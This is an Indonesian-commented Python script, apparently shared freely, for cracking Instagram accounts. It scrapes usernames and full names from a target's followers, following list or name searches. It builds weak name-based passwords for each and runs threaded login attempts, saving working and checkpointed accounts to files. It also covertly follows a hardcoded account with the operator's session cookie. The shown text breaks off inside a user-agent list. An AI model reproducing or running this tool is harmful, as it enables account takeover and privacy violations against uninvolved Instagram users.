# jangan diperjual belikan script ini free
# jangan Ganti Owner atau hp mu rusak
# kalo gak ada hasil ,oprek sendiri jangan ngandelin orang lain
# github —» https://github.com/fanky86/ig
# percuma ganteng kalo gak follow 


import os
# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()

try:
    import rich
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import requests
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul requests {H2}•{P2}")
    os.system("pip install requests")
try:
    import httpx
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul httpx {H2}•{P2}")
    os.system("pip install httpx")

import re, os, sys, json, httpx, random, urllib, hmac, hashlib, time, string, uuid, requests, base64, datetime
import subprocess
import platform
from concurrent.futures import ThreadPoolExecutor as ThreadPoolExec
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.console import Console
from rich.columns import Columns
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel as panel
from rich.panel import Panel
from rich.tree import Tree
from rich import print as sprint

# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
Z = random.choice([P,M,H,K,B,U,O,N])
#------------[ waktu ]---------------#
datetim = datetime.datetime.now()
datenow = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
file_ok = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
hari_ini = datetime.datetime.now().strftime("%d %B %Y")
current_time = datetime.datetime.now()
jam_fan = current_time.strftime("%I:%M %p")
#------------[ hapus ]---------------#
def clear():
    if "linux" in sys.platform.lower() or "darwin" in sys.platform.lower():  # Linux or macOS
        os.system("clear")
    elif "win" in sys.platform.lower():  # Windows
        os.system("cls")
    else:
        os.system("clear")  # Default to clear if platform is unknown

#------------[ Mengecek platform (Linux, Windows, atau Android) ]---------------#
andname = platform.system().lower()

# Instagram Api Endpoints, Array
FOLLOWING = 'https://www.instagram.com/api/v1/friendships/{id!s}/following/'
FOLLOWERS = 'https://www.instagram.com/api/v1/friendships/{id!s}/followers/'
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
login,ids,fanids,hitung,success,checkpoint = {},[],[], 0, 0, 0
pw_add = []

def banner():
    Console().print(
        Panel(
            """
[bold red]███████████████████████ [bold yellow]NAME  : [bold green]FANKY 
[bold red]███████████████████████ [bold yellow]Githb : [bold green]github.com/fanky86/ig
[bold red]███████████████████████ [bold yellow]scrip : [bold green]instagram
[bold white]███████████████████████ 
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",
            width=60,
            style=f"{color_panel}",
        )
    )
    

def ceklogin():
    clear()
    try:
        cookie = open('data/ig-loginfan.txt', 'r').read()
        # Regex untuk mengambil sessionid (lebih fleksibel jika ada karakter selain angka)
        sessionid_match = re.findall(r'sessionid=([\w%]+)', cookie)
        # Cek apakah sessionid ditemukan
        if sessionid_match:
            userid = sessionid_match[0]
            Console().print(f" {H2}• {P2}User ID ditemukan: {userid}")
            ini_menu_btw_fanky_cuy()
        else:
            Console().print(f" {H2}• {P2}Session ID tidak ditemukan dalam cookie")
            time.sleep(3)
            fanlogincoki()
    # Tangkap kesalahan FileNotFoundError jika file tidak ditemukan
    except FileNotFoundError:
        Console().print(f" {H2}• {P2}cookie tidak ditemukan/kadaluwarsa, silakan login ulang.")
        time.sleep(3)
        fanlogincoki()
    # Tangkap kesalahan lain jika ada masalah saat mengolah cookie
    except Exception as e:
        Console().print(f" {H2}• {P2}Terjadi kesalahan: {str(e)}")
        time.sleep(3)
        fanlogincoki()


def fanlogincoki():
    clear()
    banner()
    console.print(Panel("Masukan Cookie Akun Instagram", width=60, style="bold green"))
    cookie = console.input(f'{H2} • {P2}Masukan Cookie : ')
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        curl = httpx.get(userinfo.format(**{'id': re.findall(r'ds_user_id=(\d+)', str(cookie))[0]}), headers=HEADERS)
        info = json.loads(curl.text)['user']['full_name']
        follow(cookie)
        with open('data/ig-loginfan.txt', mode='w', encoding='utf-8') as wr:
           wr.write(f'{cookie}')
        wr.close()
        console.print(Panel(f"{P2}Selamat {H2}{info}[/], {P2}cookie kamu valid", style=f"{color_panel}", width=60))
        console.print(f"[bold green]Login Berhasil, Jalankan Ulang Script\n")
        exit()
    except Exception as e:exit(e)


def follow(cooki):
    # Konversi string cookie menjadi dictionary
    cookie = dict(item.split("=") for item in cooki.split("; "))
    url = f'https://www.instagram.com/web/friendships/45460652779/follow/'
    headers = {
        "User-Agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        response = requests.post(url, cookies=cookie, headers=headers)
        response.raise_for_status()  # Akan memicu exception jika status code bukan 2xx
        print("Berhasil mengikuti pengguna!")
    except requests.exceptions.HTTPError as http_err:
        print(f"Gagal mengikuti pengguna. HTTP error occurred: {http_err}")
    except requests.exceptions.RequestException as err:
        print(f"Gagal mengikuti pengguna. Error: {err}")

def ini_menu_btw_fanky_cuy():
    clear()
    try:
        # Coba membaca file cookie
        with open('data/ig-loginfan.txt', 'r') as f:
            cookie = f.read()
        # Regex untuk mengambil sessionid (lebih fleksibel jika ada karakter selain angka)
        sessionid_match = re.findall(r'sessionid=([\w%]+)', cookie)
        # Cek apakah sessionid ditemukan
        if sessionid_match:
            userid = sessionid_match[0]
            # Console().print(f" {H2}• {P2}User ID ditemukan: {userid}")
        else:
            Console().print(f" {H2}• {P2}Session ID tidak ditemukan dalam cookie")
            time.sleep(3)
            fanlogincoki()
    # Tangkap kesalahan FileNotFoundError jika file tidak ditemukan
    except FileNotFoundError:
        Console().print(f" {H2}• {P2}cookie tidak ditemukan/kadaluwarsa, silakan login ulang.")
        time.sleep(3)
        fanlogincoki()
    # Tangkap kesalahan lain jika ada masalah saat mengolah cookie
    except Exception as e:
        Console().print(f" {H2}• {P2}Terjadi kesalahan: {str(e)}")
        time.sleep(3)
        fanlogincoki()
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);', cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        user_id = re.findall(r'ds_user_id=(\d+)', cookie)[0]
        curl = httpx.get(userinfo.format(**{'id': user_id}), headers=HEADERS)
        info = json.loads(curl.text)['user']['full_name']
    except KeyError:
        fanlogincoki()
    banner()
    try:
        headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
        uid = re.search(r'ds_user_id=(\d+)', cookie).group(1)
        req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=headers, cookies={'cookie': cookie})
        user_data = req.json()['user']
        followers = user_data.get('follower_count', '0')
        following = user_data.get('following_count', '0')
        ip = requests.get("http://ip-api.com/json/").json()["query"]
        negara = requests.get("http://ip-api.com/json/").json()["country"]
        fankymbohmumet = []
        console.print(Panel(negara.center(60), padding=(0, 0), width=60, style=color_panel))
        fankymbohmumet.append(Panel(f"{P2}platform : {H2}{andname[:12]}\n{P2}tanggal  : {H2}{hari_ini}\n{P2}jam      : {H2}{jam_fan}\n{P2}IP       : {H2}{ip}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
        fankymbohmumet.append(panel(f"{P2}Name      : {H2}{info[:14]}\n{P2}Idz       : {H2}{user_id}\n{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",title=f"{P2}Bio Data",width=30,style=f"{color_panel}"))
        console.print(Columns(fankymbohmumet))
    except IndexError:
        print(f" {H2}• {P2}terjadi kesalahan.")
        time.sleep(3)
        exit()
    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Crack Followers
{P2}[{color_text}02{P2}]. Crack Following
{P2}[{color_text}03{P2}]. Crack Dari pencarian nama
{P2}[{color_text}04{P2}]. Check Hasil Crack
{P2}[{color_text}0{P2}]. keluar""",width=60, title="MENU", style=f"{color_panel}"))
    main = console.input(f'{H2} • {P2}Masukan : ')
    if main in   ['1','01']:
       console.print(f'{H2} • {P2}Gunakan koma untuk lebih dari 1 target')
       target = console.input(f'{H2} • {P2}Masukan Target Nama : ')
       fanwongliyoretiopo = Get_id(target)
       total  = GetFollowers(fanwongliyoretiopo, '', cookie)
       if total is False:
        console.print(f' {H2}• {M2}Terjadi kesalahan ')
        exit()
       else:crack()
    elif main in ['2','02']:
       console.print(f'{H2} • {P2}Gunakan koma untuk lebih dari 1 target')
       target = console.input(f'{H2} • {P2}Masukan Target Nama : ')
       fanwongliyoretiopo = Get_id(target)
       total  = GetFollowing(fanwongliyoretiopo, '', cookie)
       if total is False:
        console.print(f' {H2}• {M2}Terjadi kesalahan')
        exit()
       else:crack()
    elif main in ['3','03']:
       total = searchnama(cookie)
       if total is False:
        console.print(f' {H2}• {M2}Terjadi kesalahan')
        exit()
       else:crack()
    elif main in ['4','04']:
       console.print(Panel(f"""{color_text}1{P2}. Cek hasil akun OK
{color_text}2{P2}. Cek hasil akun CP""",width=60, title="CEK HASIL CRACK", style=f"{color_panel}"))
       hash = console.input(f'{H2} • {P2}Masukan : ')
       if hash in   ['1','01']:
          try:os.system('ul OK/OK.txt')
          except:console.print(f' {H2}• {M2}Terjadi kesalahan');exit()
       elif hash in ['2','02']:
          try:os.system('ul CP/CP.txt')
          except:console.print(f' {H2}• {M2}Terjadi kesalahan');exit()
       else:ini_menu_btw_fanky_cuy()
    elif main in ['0','00']:
       console.print(f'{H2} • {P2}sekalian hapus Data login? y/t')
       date = console.input(f'{H2} • {P2}Masukan : ').lower()
       if date in ['y','ya','Y']:os.system('rm -rf data/*.txt');quit(0)
       else:os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls');exit()
    else:ini_menu_btw_fanky_cuy()
    

# Fungsi untuk melakukan pencarian nama
def searchnama(cookie):
    try:
        cookie = {'cookie': cookie}
        nama = console.input(f'{H2} • {P2}Masukan Target Nama: ').strip()
        # Melakukan pencarian sebanyak 100 kali
        for ba in range(500):
            # Mengirim permintaan GET untuk mencari nama
            x = requests.get(f'https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={nama}&rank_token=0.35875757839675004&include_reel=true',cookies=cookie,headers={"user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 269.0.0.18.75 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'})
            # Mengubah respons menjadi JSON
            x_jason = json.loads(x.text)
            try:
                # Memproses hasil pencarian untuk mendapatkan username dan fullname
                for i in x_jason['users']:
                    user = i['user']
                    username = user['username']
                    fullname = user['full_name']
                    fanids.append(f'{username}<<=>>{fullname}')
                # Menampilkan progres pencarian
                sys.stdout.write(f"\r {H}•{N} sedang mengumpulkan {H}{len(fanids)} {N}username search {H}{nama}{N}")
                sys.stdout.flush()
                time.sleep(0.0002)  # Memberikan jeda antara permintaan
            except KeyError:
                if 'challenge' in x.text:  # Jika ada tantangan dari Instagram (verifikasi)
                    break
                else:
                    continue
    except (requests.exceptions.ConnectionError, 
            requests.exceptions.ChunkedEncodingError, 
            requests.exceptions.ReadTimeout):
        exit(f'\n{M}┣[!] Koneksi internet bermasalah;h{C}')
    except (KeyError, UnboundLocalError):
        exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
    except KeyboardInterrupt:
        pass
    # Mengembalikan hasil pencarian
    return fanids
   

				
def GetFollowers(user_id, max_id, cookie):
    for idfan in user_id:
        try:
            HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
            PARAMS = {'count': 200,'max_id': max_id,'search_surface': 'follow_list_page'}
            url = f"https://www.instagram.com/api/v1/friendships/{idfan}/followers/"
            response = httpx.get(url, headers=HEADERS, params=PARAMS)
            data = json.loads(response.text)
            for user in data["users"]:
                username_info = '%s<<=>>%s'%(user['username'], user['full_name'])
                if username_info not in fanids:
                    fanids.append(username_info)
                    sys.stdout.write(f"\r {H}•{N} sedang mengumpulkan {H}{len(fanids)}{N} ID")
                    sys.stdout.flush()
            if 'next_max_id' in data:
                GetFollowers(user_id, data['next_max_id'], cookie)
        except (httpx.RemoteProtocolError,AttributeError,httpx.ConnectError,KeyboardInterrupt,KeyError,requests.exceptions.ReadTimeout):
            pass
    if len(fanids) == 0:return False
    else:return True

def GetFollowing(user_id, max_id, cookie) -> str:
    for y in user_id:
       try:
           HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
           PARAMS = {'count': 200,'max_id': max_id,'search_surface': 'follow_list_page'}
           urls = httpx.get(FOLLOWING.format(**{'id': y}), params=PARAMS, headers = HEADERS)
           apcb = json.loads(urls.text)
           for yxz in apcb['users']:
               xyz = '%s<<=>>%s'%(yxz['username'], yxz['full_name'])
               if xyz not in fanids:
                  fanids.append(xyz)
                  sys.stdout.write(f"\r {H}•{N} sedang mengumpulkan {H}{len(fanids)}{N} ID")
                  sys.stdout.flush()
           if 'next_max_id' in apcb:
               GetFollowing(user_id, apcb['next_max_id'], cookie)
       except (httpx.RemoteProtocolError,AttributeError,httpx.ConnectError,KeyboardInterrupt,KeyError,requests.exceptions.ReadTimeout):
           pass
    if len(fanids) == 0:return False
    else:return True

def GetUserLikes(cookie, media_id):
    for idm in media_id:
        try:
             HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                 'x-fb-friendly-name': 'PolarisPostLikedByListDialogQuery',
                 'content-type': 'application/x-www-form-urlencoded',
                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
             }
             xxx  = httpx.get('https://accountscenter.instagram.com/personal_info/', cookies = {'cookie':cookie}).text
             uid  = re.findall(r'"actorID":"(\d+)"', str(xxx))[0]
             data = {
                 'av': uid,
                 '__d': 'www',
                 '__user': '0',
                 '__a': '1',
                 '__req': 'm',
                 '__hs': re.findall('"haste_session":"(.*?)"', str(xxx))[0],
                 'dpr': '2',
                 '__ccg': 'UNKNOWN',
                 '__rev': re.search('{"rev":(.*?)}',str(xxx)).group(1),
                 '__s': '',
                 '__hsi': re.findall(r'"hsi":"(\d+)"',str(xxx))[0],
                 '__dyn': '',
                 '__csr': '',
                 '__comet_req': '7',
                 'fb_dtsg': re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
                 'jazoest': re.findall(r'&jazoest=(\d+)',str(xxx))[0],
                 'lsd': re.search(r'"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
                 '__spin_r': re.findall(r'"__spin_r":(\d+)', str(xxx))[0],
                 '__spin_b': 'trunk',
                 '__spin_t': re.findall(r'"__spin_t":(\d+)', str(xxx))[0],
                 'fb_api_caller_class': 'RelayModern',
                 'fb_api_req_friendly_name': 'PolarisPostLikedByListDialogQuery',
                 'variables': json.dumps({"media_ids":[idm]}),
                 'server_timestamps': 'true',
                 'doc_id': '6700844413268667',
             }
             HEADERS.update({'x-fb-lsd':data['lsd']})
             response = httpx.post('https://www.instagram.com/api/graphql', cookies={'cookie':cookie}, headers=HEADERS, data=data).json()
             for i in response['data']['xdt_media_list']:
                 p = i['likers']
                 for uname in p:
                    format = '%s<<=>>%s'%(uname['username'], uname['full_name'])
                    if format not in fanids:
                       fanids.append(format)
                       sys.stdout.write(f"\r {H}•{N} sedang mengumpulkan {H}{len(fanids)}{N} ID")
                       sys.stdout.flush()
        except Exception as e:pass
    if len(fanids) == 0:return False
    else:return True

def GetUserComment(cookie, media_id, max_min):
    for idm in media_id:
        try:
             HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                 'content-type': 'application/x-www-form-urlencoded',
                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
                 'cookie': cookie
             }
             response = httpx.get(f'https://www.instagram.com/api/v1/media/{idm}/comments/?can_support_threading=true&permalink_enabled=false&min_id={max_min}', headers=HEADERS).json()
             for y in response['comments']:
                 format = '%s<<=>>%s'%(y['user']['username'], y['user']['full_name'])
                 if format not in fanids:
                    print(format)
                    fanids.append(format)
                    sys.stdout.write(f"\r {H}•{N} sedang mengumpulkan {H}{len(fanids)}{N} ID")
                    sys.stdout.flush()
             if 'next_min_id' in str(response):
                GetUserComment(cookie, media_id, response['next_min_id'])
        except Exception as e:pass
    if len(fanids) == 0:return False
    else:return True

def Get_id(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
            urls = httpx.get(getuserid.format(**{'nama':y}), headers=HEADERS).json()['data']['user']
            ids.append(urls['id'])
        except:pass
    return ids

def Find_MediaId(link,cokie):
    ahmasa = []
    for x in link.split(','):
        HEADERS.update({'cookie':cokie})
        req = httpx.get(x, headers=HEADERS).text
        idr = re.findall('{"media_id":"(.*?)"',str(req))
        if len(idr) == 0:pass
        else:ahmasa.append(idr[0].split('_')[0])
    return ahmasa


def crack():
    print('\n')
    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Crack Menggunakan Methode i.instagram.com
{P2}[{color_text}02{P2}]. Crack Menggunakan Methode www.instagram.com
{P2}[{color_text}03{P2}]. Crack Menggunakan Methode api.instagram.com
{P2}[{color_text}04{P2}]. Crack Menggunakan Methode Threads""",width=60, title="METHOD", style=f"{color_panel}"))
    method = Console().input(f" {H2}• {P2}Masukan : ")
    apsw(method)

def apsw(method):
    global iniapabree, kaloinijugaapa
    console.print(f' {H2}• {P2}Tambah Password Sendiri? (y/t)')
    weskas = console.input(f' {H2}• {P2}Masukan : ').lower()
    if weskas in ['y','ya','Y']:
       console.print(f' {H2}• {P2}Gunakan koma buat pemisah')
       paswd = console.input(f' {H2}• {P2}Masukan : ')
       for y in paswd.split(','):
           if len(y) <=5:pass
           else:pw_add.append(y)
    else:pass
    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lambat\n{P2}[{color_text}02{P2}]. Cepat""",width=60, title="MENU FAST/SLOW", style=f"{color_panel}"))
    lib = console.input(f' {H2}• {P2}Masukan : ')
    if lib in ['1','01']:login.update({'Lib':'htx'})
    else:login.update({'Lib':'req'})
    urut = []
    urut.append(panel(f'[bold green]OK/OK.txt [bold white]',width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]CP/CP.txt [bold white]',width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    console.print(Columns(urut))
    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]200[bold yellow] ID ',title=f"[bold yellow]CRACK-FANKY-GANTENG",width=60,style=f"{color_panel}"))
    iniapabree = Progress(TextColumn('{task.description}'))
    kaloinijugaapa = iniapabree.add_task('',total=len(fanids))
    with iniapabree:
       with ThreadPoolExec(max_workers=35) as pikha:
          for i in fanids:
             username, password = i.split('<<=>>')
             apacobabg = generate(password.lower())
             if method in   ['1','01']:pikha.submit(i_insta, username, apacobabg)
             elif method in ['2','02']:pikha.submit(www_insta, username, apacobabg)
             else:pikha.submit(api_insta, username, apacobabg)
    if success == 0 and checkpoint == 0:
       console.print(f' {H2}• {P2}Maaf Bree Kamu Gk Dapat Hasil')
       exit()
    else:
       Console().print(Panel(f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",subtitle="╭───",subtitle_align="left",title=f"[bold green]FINISH",width=60,style=f"{color_panel}"))
       Console().print(f"[bold cyan]   ╰[bold green] OK ─> {success}	[bold yellow]CP ─> {checkpoint}")
       print("")
       exit()
    quit(0)

def generate(name):
    xxx = []
    if len(pw_add) >=1:
       for awokawok in pw_add:
           xxx.append(awokawok)
    for y in name.split(' '):
        if len(y) <3:pass
        elif len(y) == 3 or len(y) == 4 or len(y) == 5:
           xxx.append(y+'123')
           xxx.append(y+'1234')
           xxx.append(y+'12345')
           xxx.append(f'{y.capitalize()}123')
           xxx.append(f'{y.capitalize()}1234')
        else:
           xxx.append(y+'123')
           xxx.append(y+'1234')
           xxx.append(y+'12345')
           xxx.append(f'{y.capitalize()}123')
           xxx.append(f'{y.capitalize()}1234')
           if len(y) >=5:
              xxx.append(y)
           else:pass
           if len(name) >=5:
              xxx.append(name)
           else:pass
    return xxx

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall(r'sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall(r'ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s; %s; %s; ig_nrcb=1; dpr=2;'%(csrft, ds_id, sesid)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

def info(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
            urls = httpx.get(getuserid.format(**{'nama':y}), headers=HEADERS).json()['data']['user']
            peng = urls["edge_followed_by"]["count"]
            meng = urls["edge_follow"]["count"]
        except Exception as e:
            peng,meng = None, None
    return peng,meng

def UserAgent():
    rr=random.randint
    rc=random.choice
    andro=rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
    dpis=rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
    pxl=rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x226